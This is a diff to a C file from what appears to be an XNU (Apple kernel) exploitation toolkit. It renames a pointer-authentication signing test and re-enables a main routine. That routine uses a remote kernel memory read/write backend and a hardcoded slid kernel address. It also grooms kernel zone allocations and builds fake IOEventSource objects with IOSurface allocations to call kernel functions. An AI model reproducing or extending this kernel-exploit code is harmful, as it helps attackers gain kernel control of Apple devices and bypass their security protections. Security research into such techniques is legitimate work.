@@ -32,7 +32,7 @@
 #include "util_assert.h"
 
 
-int main(int argc, const char* argv[]) {
+int test_pacda(int argc, const char* argv[]) {
     xe_assert_cond(argc, ==, 2);
     
     struct xe_kmem_backend* backend = xe_kmem_remote_client_create(argv[1]);
@@ -43,7 +43,7 @@ int main(int argc, const char* argv[]) {
     printf("[INFO] pid: %d\n", getpid());
     printf("[INFO] proc: %p\n", (void*)proc);
     
-    for (int i=0; i<1; i++) {
+    for (int i=0; i<10; i++) {
         uintptr_t ptr = proc;
         uintptr_t ctx = 0xabcdef;
         uintptr_t signed_ptr;
@@ -59,19 +59,14 @@ int main(int argc, const char* argv[]) {
     return 0;
 }
 
-/*
-int main0(int argc, const char* argv[]) {
+int main(int argc, const char* argv[]) {
     struct xe_kmem_backend* backend = xe_kmem_remote_client_create(argv[1]);
     xe_kmem_use_backend(backend);
     xe_slider_init(xe_kmem_remote_client_get_mh_execute_header(backend));
     
-    uintptr_t record_function;
-    int error = gym_get_record_function_address(&record_function);
-    xe_assert_err(error);
-    record_function = XE_PTRAUTH_STRIP(record_function);
+    uintptr_t record_function = xe_slider_slide(0xfffffe0007aaba58);
     
-    uintptr_t kernproc = xe_kmem_read_uint64(xe_slider_slide(VAR_KERNPROC_ADDR));
-    uintptr_t proc = xe_xnu_proc_current_proc(kernproc);
+    uintptr_t proc = xe_xnu_proc_current_proc();
     
     xe_util_zalloc_t io_event_source_allocator = xe_util_zalloc_create(xe_kmem_read_uint64(xe_slider_slide(VAR_ZONE_IO_EVENT_SOURCE)), 1);
     xe_util_zalloc_t block_allocator = xe_util_zalloc_create(xe_util_kh_find_zone_for_size(xe_slider_slide(VAR_KHEAP_DEFAULT_ADDR), 128), 1);
@@ -84,7 +79,7 @@ int main0(int argc, const char* argv[]) {
         uintptr_t io_event_source2 = xe_util_kfunc_build_event_source(util2, record_function);
         
         iokit_iosurface_allocator_t allocator;
-        error = iokit_iosurface_allocator_create(&allocator);
+        int error = iokit_iosurface_allocator_create(&allocator);
         xe_assert_err(error);
         
         size_t alloc_idx;
@@ -108,4 +103,3 @@ int main0(int argc, const char* argv[]) {
         xe_util_kfunc_reset(util2);
     }
 }
-*/
